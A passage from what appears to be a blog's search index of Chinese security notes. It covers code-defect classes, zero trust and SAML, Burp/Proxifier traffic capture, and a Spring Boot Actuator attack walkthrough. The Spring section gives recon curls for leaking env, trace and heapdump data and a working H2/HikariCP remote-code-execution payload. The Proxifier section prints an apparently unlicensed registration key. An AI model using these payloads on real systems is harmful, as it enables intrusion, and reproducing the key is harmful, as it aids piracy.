href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>软件代码缺陷概述</title>
      <link href="Kali/PostExploit/%E8%BD%AF%E4%BB%B6%E4%BB%A3%E7%A0%81%E7%BC%BA%E9%99%B7%E6%A6%82%E8%BF%B0.html"/>
      <url>Kali/PostExploit/%E8%BD%AF%E4%BB%B6%E4%BB%A3%E7%A0%81%E7%BC%BA%E9%99%B7%E6%A6%82%E8%BF%B0.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="软件供应链安全分析"><a href="#软件供应链安全分析" class="headerlink" title="软件供应链安全分析"></a>软件供应链安全分析</h1><h2 id="源代码缺陷"><a href="#源代码缺陷" class="headerlink" title="源代码缺陷"></a>源代码缺陷</h2><pre><code> 在SDL(Security Development Lifecycle)中的编码阶段产生的缺陷。</code></pre><h3 id="产生缺陷的原因"><a href="#产生缺陷的原因" class="headerlink" title="产生缺陷的原因"></a>产生缺陷的原因</h3><ul><li>开发人员的经验和能力限制</li><li>引入某些开源项目</li><li>产品发布前未进行安全测试，仅进行功能测试和性能测试</li></ul><h2 id="缺陷的类型"><a href="#缺陷的类型" class="headerlink" title="缺陷的类型"></a>缺陷的类型</h2><h3 id="输入验证类"><a href="#输入验证类" class="headerlink" title="输入验证类"></a>输入验证类</h3><pre><code>从安全角度来看，一切外部来源的数据均应视为不可信数据任何输入内容均应在经过严格过滤或验证后，再进行相应的逻辑处理或存储</code></pre><p>   常见输入验证类缺陷</p><ul><li>SQL注入</li><li>XSS</li><li>LDAP注入</li><li>XPath注入</li><li>OS命令注入</li><li>XML外部实体注入</li></ul><h4 id="缺陷成因"><a href="#缺陷成因" class="headerlink" title="缺陷成因"></a>缺陷成因</h4><blockquote><p>输入数据=(特殊字符、编码、数字) =&gt; 注入载体(Payload)</p></blockquote><blockquote><p>Payload= (几乎任何)外部数据源&lt;环境变量、所有类型的用户参数、外部Web服务等&gt;</p></blockquote><p>程序未对 <strong>输入数据</strong> 进行有效验证所导致的缺陷</p><h4 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h4><blockquote><p>通用的解决方式 ：对<strong>输入进行验证，对输出进行编码</strong></p></blockquote><ul><li><p>输入验证</p><ol><li>对所有输入明确字符集，如UTF-8</li><li>对Request进行数据验证，如数据是否包含超出预期字符，数据范围，数据长度，数据类型</li></ol></li><li><p>输出编码</p><ol><li>通过语意输出编码方式，对所有返回到客户端的来自应用程序信任边界之外的数据进行编码，净化所有不可信的数据输出</li><li>在基本字符不满足业务规则时，需要对危险字符(&lt;、&gt;、\、、%、\、、)进行输出编码，使用特定的安全API</li></ol></li></ul><h3 id="资源管理类"><a href="#资源管理类" class="headerlink" title="资源管理类"></a>资源管理类</h3><pre><code>   指因程序对内存、文件、流、密码等资源的管理或使用不当而导致的缺陷。</code></pre><p>   常见资管管理类漏洞</p><ul><li>缓冲区上益/下溢</li><li>资源未释放</li><li>内存泄漏</li><li>硬编码密码</li></ul><h4 id="缺陷成因-1"><a href="#缺陷成因-1" class="headerlink" title="缺陷成因"></a>缺陷成因</h4><h5 id="内存资源使用不当"><a href="#内存资源使用不当" class="headerlink" title="内存资源使用不当"></a>内存资源使用不当</h5><pre><code>内存资源的不当使用通常会导致程序运行破坏、提升权限等危害</code></pre><ul><li>缓冲区溢出：<pre><code>  针对程序设计缺陷，向程序源缓冲区写入使之溢出的内容(超过缓冲区能保存的最大数据量的数据)， 从而破坏程序运行或趁着中断之际获取程序乃至系统的控制权，根据溢出边界不同分为缓冲区上溢和下溢。</code></pre></li><li>越界访问<pre><code>  当程序访问一个数组中的元素时，如果索引值超过数组的长度，就会导致访问数组之外的内存，出现越界情况。</code></pre></li></ul><h5 id="内存、文件、流等资源管理不当"><a href="#内存、文件、流等资源管理不当" class="headerlink" title="内存、文件、流等资源管理不当"></a>内存、文件、流等资源管理不当</h5><table><thead><tr><th>缺陷名称</th><th>定义</th></tr></thead><tbody><tr><td>内存泄漏</td><td>动态申请的内存未进行有效的释放</td></tr><tr><td>释放后使用</td><td>申请的内存被释放后继续被使用的情况</td></tr><tr><td>二次释放</td><td>对已经释放后的内存进行重复释放</td></tr><tr><td>错误的内存释放对象</td><td>释放的对象并非动态分配的内存</td></tr></tbody></table><h5 id="密码的管理不当"><a href="#密码的管理不当" class="headerlink" title="密码的管理不当"></a>密码的管理不当</h5><pre><code>程序中硬编码会带来敏感信息泄漏、维护困难等问题，弱加密不能有效保护密码</code></pre><h4 id="防范措施-1"><a href="#防范措施-1" class="headerlink" title="防范措施"></a>防范措施</h4><ol><li>对不可信数据进行输入和输出控制。<br>   在进行内存操作时，检查缓存大小，以确保不会出现超出分配空间大小的风险</li><li>在内存、文件、流等资源使用完毕后应正确释放资源<br>   多次资源分配且未合理释放会耗尽资源，导致拒绝服务攻击</li><li>所有进程和线程都应遵循相同的锁定<a href="%E9%94%81%E5%AE%9A%E6%98%AF%E4%B8%80%E7%A7%8D%E5%90%8C%E6%AD%A5%E8%A1%8C%E4%B8%BA%EF%BC%8C%E5%8F%AF%E7%A1%AE%E4%BF%9D%E8%AE%BF%E9%97%AE%E7%9B%B8%E5%90%8C%E8%B5%84%E6%BA%90%E6%97%B6%E5%A4%9A%E4%B8%AA%E7%8B%AC%E7%AB%8B%E8%BF%90%E8%A1%8C%E7%9A%84%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B%E4%B8%8D%E4%BC%9A%E4%BA%92%E7%9B%B8%E5%B9%B2%E6%89%B0%E3%80%82">^1</a>步骤<br>  若未严格遵循这些步骤，那么其他进程和线程可以以原始进程不可见或无法预测的方式修改共享资源，导致数据或内存损坏、拒绝服务等</li><li>为防范对随机数据的猜测攻击，应当使用加密模块中已验证的随机数生成器生成所有的随机数、随机GUID和随机字符串。保护主要秘密信息免受未授权的访问并使用相关的政策和流程以实现加、解密的密钥管理，使用AES加密算法更安全。同时避免使用硬编码密码的方式存储密码。</li></ol><h3 id="代码质量类"><a href="#代码质量类" class="headerlink" title="代码质量类"></a>代码质量类</h3><pre><code>指由于代码编写不当所导致的缺陷，低劣的代码质量会导致不可预测行为的发生。</code></pre><h4 id="缺陷成因-2"><a href="#缺陷成因-2" class="headerlink" title="缺陷成因"></a>缺陷成因</h4><h5 id="整数问题"><a href="#整数问题" class="headerlink" title="整数问题"></a>整数问题</h5><pre><code>整数分为有符号整数和无符号整数，且有各自的取值范围。当值超出各自的取值范围时会发生回绕</code></pre><h5 id="空指针解引用"><a href="#空指针解引用" class="headerlink" title="空指针解引用"></a>空指针解引用</h5><pre><code>指针存储的是它指向的变量的地址解引用就是引用它指向的变量的值</code></pre><p>当指针的值为NULL或未初始化时，对其进行解引用，会导致程序异常崩溃或者出现其他未定义的行为。</p><h5 id="初始化问题"><a href="#初始化问题" class="headerlink" title="初始化问题"></a>初始化问题</h5><pre><code>根据未初始化变量的位置的不同可分为- 返回值未初始化- 参数未初始化- 赋值未初始化等</code></pre><p>变量在使用前应该被初始化，如果没有进行初始化，那该变量默认值时不确定的，使用此默认值可能导致出现未定义的行为<br>若此变量时指针类型且没有初始化的情况下进行了解引用，那么会导致空指针解引用</p><h5 id="不当的循环终止"><a href="#不当的循环终止" class="headerlink" title="不当的循环终止"></a>不当的循环终止</h5><pre><code>在循环语句中，循环体被重复执行的次数由循环条件所控制。它是一个标量表达式若控制表达式的值不等于0，循环条件为true；反之循环条件为false。当循环条件设置不当时，会导致死循环的产生。</code></pre><h4 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h4><ul><li>在使用整数时，要避免操作结果超出整数的取值范围</li><li>在使用指针时，要判断其是否为空</li><li>变量在定义或声明时进行初始化，养成良好的编码习惯</li><li>描述循环问题时，要注意设置恰当的循环条件</li></ul><h2 id="发现缺陷的方法"><a href="#发现缺陷的方法" class="headerlink" title="发现缺陷的方法"></a>发现缺陷的方法</h2><h3 id="人工审计"><a href="#人工审计" class="headerlink" title="人工审计"></a>人工审计</h3><pre><code>人工对源代码进行走查，依据缺陷的特征进行查找和分析，从而确定是否存在缺陷。优点：    人工审计优势体现在可以发现与业务逻辑等相关的缺陷 缺点：     对审计人员能力要求高，需具备熟悉软件业务，读懂源码，且具有丰富安全知识</code></pre><h3 id="工具审计"><a href="#工具审计" class="headerlink" title="工具审计"></a>工具审计</h3><pre><code>运行源码缺陷检测工具，自动发现源码中存在的缺陷</code></pre><p>  自动化检测工具通常内置多种检测规则，在接收到输入内容后，将输入内容转变为易于扫描分析的数据结构，然后使用静态分析技术对其进行分析，从而发现源码中存在符合一定模式的缺陷。<br>      优缺点：<br>          效率高，存在误报漏报问题</p><ul><li>奇安信代码卫士</li><li>360代码卫士</li><li>端玛DMSCA</li><li>VeraCode静态源代码扫描分析服务平台</li><li>Fortify SCA 及 Checkmarx产品扫描服务</li></ul><h3 id="人工审计与工具审计结合"><a href="#人工审计与工具审计结合" class="headerlink" title="人工审计与工具审计结合"></a>人工审计与工具审计结合</h3><pre><code>先通过工具审计的方式获取检测结果，然后再人工对检测结果进行复审，从而发现缺陷。</code></pre><h2 id="缺陷处置流程"><a href="#缺陷处置流程" class="headerlink" title="缺陷处置流程"></a>缺陷处置流程</h2><h3 id="1-发现并确认缺陷"><a href="#1-发现并确认缺陷" class="headerlink" title="1.发现并确认缺陷"></a>1.发现并确认缺陷</h3><ul><li>与开发流程整合<ul><li>开发人员可以在管理平台中配置好任务计划，检测工具根据任务计划的设定，自动从SVN、Git等代码仓库中获取代码进行检测。检测结束后，可以查看检测结果并进行审计。</li></ul></li><li>安全部门实施测试<ul><li>在系统上线前，安全部门要对全部源代码进行一次安全检测和审计，对软件源代码的安全状况进行整体把控，并修复发现的安全缺陷，在代码各项指标达到最初设定的安全目标后方可上线发布。</li></ul></li></ul><h3 id="2-修复缺陷"><a href="#2-修复缺陷" class="headerlink" title="2.修复缺陷"></a>2.修复缺陷</h3><p>缺陷修复通常由开发和运维人员修复。开发人员需要根据缺陷的具体信息，制定修复方案，确认方案无误后可修改源代码，完成缺陷修复</p><h3 id="3-回归测试"><a href="#3-回归测试" class="headerlink" title="3.回归测试"></a>3.回归测试</h3><p>需要对修复后的源代码进行回归测试，用于确认缺陷是否已经被修复且未引入新的缺陷。</p><h2 id="自动化缺陷检测技术"><a href="#自动化缺陷检测技术" class="headerlink" title="自动化缺陷检测技术"></a>自动化缺陷检测技术</h2><h3 id="语法分析技术"><a href="#语法分析技术" class="headerlink" title="语法分析技术"></a>语法分析技术</h3><pre><code>语法分析指按照具体编程语言的语法规则处理词法，分析程序产生的结果并生成语法分析树的过程，是编译过程中的重要步骤，也是其他分析的基础。</code></pre><p>   此过程可以判断程序中是否存在语法错误(是否与BNF范式一致)</p><h3 id="类型分析技术"><a href="#类型分析技术" class="headerlink" title="类型分析技术"></a>类型分析技术</h3><p>类型分析主要指类型检查，分析程序中是否存在类型错误。<br>类型错误通常指违反类型约束的操作，</p><h3 id="控制流分析技术"><a href="#控制流分析技术" class="headerlink" title="控制流分析技术"></a>控制流分析技术</h3><p>控制流分析的输出是控制流图，<br>通过控制流图可以得到关于程序结构的一些描述，包括条件、循环等信息。</p><h3 id="数据流分析技术"><a href="#数据流分析技术" class="headerlink" title="数据流分析技术"></a>数据流分析技术</h3><p>数据流分析用于获取有关数据如何在程序的执行路径上流程的信息。<br>同时污染传播分析也是数据流分析技术的一种应用。</p><h2 id="代码安全保障技术趋势"><a href="#代码安全保障技术趋势" class="headerlink" title="代码安全保障技术趋势"></a>代码安全保障技术趋势</h2><p>随着开发模式的不断演进和信息安全趋势的变化，人们对代码安全保障技术提出了规模化、自动化、智能化的要求，以期实现软件快速、安全、自动的发布。</p><h3 id="基于AI的代码安全分析"><a href="#基于AI的代码安全分析" class="headerlink" title="基于AI的代码安全分析"></a>基于AI的代码安全分析</h3><pre><code>人工智能技术和传统代码安全技术的结合是代码安全领域的重要发展趋势之一。</code></pre><p>引入人工智能后，我们可以将SAST工具的结果作为输入，不断进行缺陷训练，从而发现误报，<br>然后系统会输出某个置信水平内的误报列表(或排除误报的列表)。<br>为了对其进行进一步的改进，可以通过结果的审计，识别出新的误报并反馈到训练集中，计算出新的模型。</p><h3 id="面向安全的软件代码成分分析"><a href="#面向安全的软件代码成分分析" class="headerlink" title="面向安全的软件代码成分分析"></a>面向安全的软件代码成分分析</h3><pre><code>SCA技术和其他AST技术的深入融合也是代码安全技术发展的趋势之一。</code></pre><p>软件代码成分分析(Software Composition Analysis,SCA)技术指通过对软件的组成(如源码、字节码、二进制文件、可执行文件等)进行分析，<br>识别出软件中使用的开源和第三方组件(如 底层库、框架等)，<br>进一步发现开源安全风险和第三方组件的漏洞。</p><h3 id="面向DevSecOps的代码安全测试"><a href="#面向DevSecOps的代码安全测试" class="headerlink" title="面向DevSecOps的代码安全测试"></a>面向DevSecOps的代码安全测试</h3><pre><code>能够在代码编写的同时，发现代码中的安全隐患，从而在第一时间修复，成为DevSecOps的基本需求。因此IDE插件、轻量级的客户端快速检测模式也成为下一代代码安全产品的标配。</code></pre><p>   由于大量应用持续集成，部署在DevOps中，代码安全产品需要与Jenkins、Bamboo等持续集成系统，Bugzilla、Jira等生命周期管理系统进行集成，实现有效的自动化。<br>   同时，提供针对代码安全基线的检测，以及增量分析、审计信息携带等功能，可在少量或没有人工参与的情况下，尽可能快速、有效保证软件的安全性。</p><h3 id="交互式应用安全测试"><a href="#交互式应用安全测试" class="headerlink" title="交互式应用安全测试"></a>交互式应用安全测试</h3><pre><code>IAST技术结合DAST技术和SAST技术，从而提高测试的准确率，同时对代码的测试覆盖率达到了与SAST相似的水平。</code></pre><p>IAST的插桩模式原理：<br>插桩探针想要分析数据流需要做两件事：</p><ol><li>理解代码<pre><code> 根据不同语言来区分需要关注哪些函数，这些函数里哪些是污点输入？哪些是污点传播？哪些是污点清洗？以及又有哪些是污点汇聚？这个我们可以根据不同的漏洞原理来做分析.</code></pre></li><li>捕获关键关键函数的调用情况<pre><code> Java提供了一个instrumentation 接口。通过该接口，可以以一种标准的方式，在启动应用时添加javaagent参数来加载插桩探针，通过Agent获取到JAVA的目标代码（字节码）、并修改字节码的方式在程序目标码确定函数执行点，并追踪函数执行过程，分析数据流。从而实现动态数据流污点追踪。</code></pre></li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> PostExploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ZeroTrust</title>
      <link href="Kali/PostExploit/ZeroTrust.html"/>
      <url>Kali/PostExploit/ZeroTrust.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="EAA"><a href="#EAA" class="headerlink" title="EAA"></a>EAA</h2><h3 id="现有解决方案及其局限性"><a href="#现有解决方案及其局限性" class="headerlink" title="现有解决方案及其局限性"></a>现有解决方案及其局限性</h3><ul><li>应用直接面对公网威胁</li><li>VPN部署和防火墙规则不灵活，VPN访问慢</li><li>多应用情况下的单点登陆</li><li>对访问终端安全没有控制方式，恶意软件，网络钓鱼和数据泄露</li></ul><p>Akamai方案EAA</p><ul><li><p>访问的安全性 </p></li><li><p>网络的安全性</p></li><li><p>访问审计的安全性</p></li><li><p>管理的易用性</p></li><li><p>运营成本的支出</p></li><li><p>Akamai EAA方案优点</p><ul><li>快速安装部署无需安装客户端</li><li>降低资本支出和运营成本</li><li>简化管理</li><li>确保应用安全</li></ul></li></ul><p><a href="https://docs.authing.cn/v2/guides/connections/">Identity Provider(IdP)</a></p><p>外部身份源（Identity Provider，简称 IdP）指的是一个存储和管理用户信息的外部服务，使用外部身份服务商可以降低用户管理成本以及降低用户使用成本。</p><h2 id="零信任网络安全框架"><a href="#零信任网络安全框架" class="headerlink" title="零信任网络安全框架"></a>零信任网络安全框架</h2><p><a href="https://docs.authing.cn/v2/concepts/zero-trust-network.html">https://docs.authing.cn/v2/concepts/zero-trust-network.html</a></p><p>概念： 零信任是一种安全模型，基于多种信任要素（如访问主体身份、网络环境、终端状态等）对所有用户进行持续验证和动态授权。  （由弗雷斯特研究公司首席分析师JohnKindervag提出）</p><p><a href="https://www.akamai.com/zh/lp/report/forrester-zero-trust-wave-q3-2020-report">Akamai 被评为 Zero Trust 领导者</a></p><ul><li><p>传统的安全模型通过 <strong>一次验证+静态授权</strong>的方式评估实体风险，</p></li><li><p>而零信任基于 <strong>持续验证+动态授权</strong> 的模式构筑企业的安全基石。</p></li></ul><p>零信任核心原则</p><p><img src="https://download.huawei.com/mdl/image/download?uuid=304b36b98b664f858a6d1a0afa51a5bd"></p><ul><li>永不信任，持续验证 构建身份安全基石</li></ul><p>​        零信任对人，终端和应用进行统一身份化管理，建立以身份为中心的访问控制机制。</p><p>​        以动态考量因素(如访问主体身份、网络环境、终端状态等)持续检测访问过重中违规和异常行为，确保接入网络的用户和终端持续可信</p><ul><li>动态授权 ， 精细访问控制，权限随需而动</li></ul><p>​        零信任将访问目标的权限细化到应用级、功能级、数据级，只对访问主体开放所需的应用、功能或数据，满足最小权限原则，收缩潜在攻击面。</p><p>​        同时安全控制策略给予访问主体、目标客体、环境属性(终端状态、网络风险、用户行为等)进行权限动态判定，实现应用功能、数据等维度的精细划分和动态控制。</p><ul><li>全局防御， 协同联动，威胁快速处置</li></ul><p>​        零信任通过对终端风险、用户行为异常、流量威胁、应用鉴权行为进行多方面评估，对信任分低的应用或设备生成相应的处置策略，联动网络或安全设备进行威胁快速处置。</p><p>零信任的技术本质是以身份为基石的动态访问控制，其主要价值为将安全能力内嵌入业务体系，构建自适应的内生安全机制。</p><p>好处：</p><p>场景一：异地协同办公，数据融合管理，业务云化部署</p><p>每个用户及其所使用的访问设备进行身份验证，同时将每个用户的权限降低到处理其业务所需的绝对最小权限。</p><p>企业部署场景</p><ul><li>具有远程分支机构</li><li>多云</li><li>有大量非员工访问需求</li><li>跨企业边界的写作文</li><li>面向公众的服务企业</li></ul><h2 id="零信任架构（ZTA）实施建议"><a href="#零信任架构（ZTA）实施建议" class="headerlink" title="零信任架构（ZTA）实施建议"></a>零信任架构（ZTA）实施建议</h2><ol><li>零信任：同步工作<ul><li>优先考虑实施，关键网络最先实施</li><li>设置零信任管理岗位</li><li>数据通信全程加密</li></ul></li><li>用户认证<ul><li>探索和测试颗粒度更细的用户属性</li><li>身份管理者统一管理</li><li>管理职权依赖任务临时分配</li><li>开发用户许可级别</li><li>各组织之间制定共同战略</li><li>将零信任原则作为用户和设备的基线</li></ul></li><li>设备认证<ul><li>准入前设备检查和定期设备健康检查</li><li>记录设备使用日志</li><li>构建 “以便携为中心” 的设备管理</li></ul></li><li>最小权限访问授权<ul><li>使用单一联合授权源</li><li>精细的级别标记数据和资源</li><li>用户和设备位置与授权解耦</li></ul></li></ol><h2 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h2><h3 id="EAA与VPN的区别和优势"><a href="#EAA与VPN的区别和优势" class="headerlink" title="EAA与VPN的区别和优势"></a>EAA与VPN的区别和优势</h3><h3 id="SAML身份验证机制"><a href="#SAML身份验证机制" class="headerlink" title="SAML身份验证机制"></a><a href="https://help.aliyun.com/document_detail/174224.html?utm_content=g_1000230851&spm=5176.20966629.toubu.3.f2991ddcpxxvD1#CWelL">SAML身份验证机制</a></h3><p><img src="https://docs.citrix.com/en-us/citrix-adc/media/saml-flow-citrix.png"></p><p>SAML（Security Assertion Markup Language）是一个基于XML的开放标准数据格式，用于在不同的安全域之间交换认证和数据授权。SAML解决的最重要的需求是Web端应用的单点登录（SSO）</p><h3 id="SAML协议工作流程"><a href="#SAML协议工作流程" class="headerlink" title="SAML协议工作流程"></a>SAML协议工作流程</h3><p>SAML角色： </p><ul><li><p>SP(Service Provider) : 向用户提供服务的web 端应用</p></li><li><p>IdP(Identity Provider) : 向SP提供用户身份信息</p></li><li><p>User : 通过登录IDP获取身份断言，并向SP返回身份断言来使用SP提供服务的用户</p></li></ul><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/4993794951/p132458.png"></p><ol><li>用户请求访问 Web 应用系统。</li><li>Web 应用系统生成一个 SAML 身份验证请求。</li><li>Web 应用系统将重定向网址发送到用户的浏览器。重定向网址包含应向SSO 服务提交的编码 SAML 身份验证请求。</li><li>IDP 对 SAML 请求进行解码。</li><li>IDP对用户进行身份验证。认证成功后，IDP生成一个 SAML 响应，其中包含经过验证的用户的用户名。然后将SAML 响应编码并返回到用户的浏览器。</li><li>浏览器将 SAML 响应转发到 Web 应用系统 ACS URL。</li><li>Web 应用系统使用 IDP 的公钥验证 SAML 响应。如果成功验证该响应，ACS 则会将用户重定向到目标网址。</li><li>用户将重定向到目标网址并登录到 Web 应用系统。</li></ol><p>在 SAML 协议中，IDP 和 SP 不需要直接进行通讯，只要用户浏览器可以访问到 IDP 和 SP 即可。</p><p>也就是说 SAML 协议在混合云环境下也可以正常进行使用，只要用户浏览器可以访问到公有云的 IDP 和内网的应用就可以使用 SAML 协议集成应用的单点登录。</p><p>参考：</p><p><a href="https://info.support.huawei.com/info-finder/encyclopedia/zh/%E9%9B%B6%E4%BF%A1%E4%BB%BB.html">什么是零信任，为什么零信任很重要</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> PostExploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>如何在mac上抓小程序的流量</title>
      <link href="Kali/PostExploit/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F.html"/>
      <url>Kali/PostExploit/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="Burpsuite抓取微信小程序流量"><a href="#Burpsuite抓取微信小程序流量" class="headerlink" title="Burpsuite抓取微信小程序流量"></a>Burpsuite抓取微信小程序流量</h2><p>通过Proxifier工具代理微信小程序流量到Burp</p><ol><li>安装Burpsuite证书到macOS系统中</li></ol><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109291302084burp_cert.png"></p><ol start="2"><li>安装proxifier并添加Proxifier规则</li></ol><blockquote><p>Your name or company name:<br>macwk.com<br>Your registration key:<br>2DNRX-V3PNK-TEGYN-DR01D-9UGGT</p></blockquote><pre><code class="shell">brew install --cask proxifier</code></pre><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109291312960proxif_reg.png"></p><p>添加代理和配置代理规则</p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109291359940proxi_prox.png"></p><blockquote><p>微信小程序路径 : /Applications/WeChat.app/Contents/MacOS/Mini Program.app</p></blockquote><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109291408305proxi_rule.png"></p><blockquote><p>⚠️ 先启动Proxifier，再启动Burpsuite，最后打开微信小程序,(最好关掉其他代理)</p></blockquote><p>抓包成功</p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109291449850prox_burp.png"></p><p>存在其他代理(如clashX)时，Proxifier设置方法</p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109291505365proxi.png"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> PostExploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Spring</title>
      <link href="Kali/Exploit/Spring.html"/>
      <url>Kali/Exploit/Spring.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>推荐资料：</p><ul><li><a href="https://github.com/LandGrey/SpringBootVulExploit">SpringBootVulExploit</a></li><li><a href="https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/">Spring 框架漏洞集合</a></li><li><a href="https://www.cnblogs.com/cwkiller/p/12829974.html">Spring Boot Actuator H2 RCE复现</a></li></ul><ul><li><a href="https://www.jianshu.com/p/91a5ca9b7c1c">Spring Boot Actuator(eureka xstream deserialization RCE)</a></li></ul><p><strong>Spring</strong> 是为解决企业应用开发的复杂性而创建的一个开源框架。<br>    主要的设计思想是有两个：</p><ul><li><code>控制反转IOC</code><br>IOC是一种设计思想，将原本在程序中自己手动创建对象的控制权，交由 Spring 框架来管理。</li><li><code>面向方面编程AOP</code><br>利用一种称为”横切”的技术，剖解开封装的对象内部，并将那些影响了多个类的公共行为封装到一个可重用模块，并将其命名为”Aspect”，即切面。</li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code class="zsh">nmap -Pn -T4  -p 8080  -sV --version-all 192.168.79.28Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-15 17:18 CSTNmap scan report for 192.168.79.28Host is up (0.00019s latency).PORT     STATE SERVICE    VERSION8080/tcp open  http-proxy</code></pre><p>访问不存在的页面包含以下信息证明使用了Spring Boot</p><pre><code class="html">Whitelabel Error PageThis application has no explicit mapping for /error, so you are seeing this as a fallback.Tue Dec 15 09:35:57 GMT 2020There was an unexpected error (type=Not Found, status=404).No message available</code></pre><p>Spring API信息获取</p><pre><code class="zsh">curl -v &#39;http://192.168.79.28:8080/trace&#39;  # 获取用户认证字段curl -v &#39;http://192.168.79.28:8080/env&#39;    # 服务器配置信息，包括数据库curl -v &#39;http://192.168.79.28:8080/health&#39;  # 泄漏git项目地址curl -v &#39;http://192.168.79.28:8080/heapdump&#39; # 泄漏后台用户信息curl -v &#39;http://192.168.79.28:8080/&#39;curl -v &#39;http://192.168.79.28:8080/&#39;curl -v &#39;http://192.168.79.28:8080/&#39;curl -v &#39;http://192.168.79.28:8080/&#39;## Spring Boot Actuator H2 with HikariCP远程代码执行**Actuator** 是 Spring Boot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。  Actuator 配置不当导致应用系统监控信息泄露对应用系统及其用户的危害是巨大的更多[Spring Boot Rest API](https://howtodoinjava.com/spring-boot2/rest/rest-api-example/)```zsh curl  &#39;http://192.168.79.28:8080/actuator&#39;  # 查看actuator下的端点actuator/env&#123;&quot;_links&quot;:&#123;&quot;self&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator&quot;,&quot;templated&quot;:false&#125;,&quot;env-toMatch&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator/env/&#123;toMatch&#125;&quot;,&quot;templated&quot;:true&#125;,&quot;env&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator/env&quot;,&quot;templated&quot;:false&#125;,&quot;restart&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator/restart&quot;,&quot;templated&quot;:false&#125;&#125;&#125;%</code></pre><p>发送EXP</p><pre><code class="json">POST /actuator/env HTTP/1.1content-type: application/json&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS EXEC AS &#39;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&#39;; CALL EXEC(&#39;/Applications/Calculator.app/Contents/MacOS/Calculator&#39;);&quot;&#125;POST /actuator/restart HTTP/1.1content-type: application/json&#123;&#125;</code></pre><pre><code class="zsh">curl -X &#39;POST&#39; -H &#39;Content-Type: application/json&#39; --data-binary $&#39;&#123;\&quot;name\&quot;:\&quot;spring.datasource.hikari.connection-test-query\&quot;,\&quot;value\&quot;:\&quot;CREATE ALIAS EXEC AS CONCAT(\&#39;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new\&#39;,\&#39; 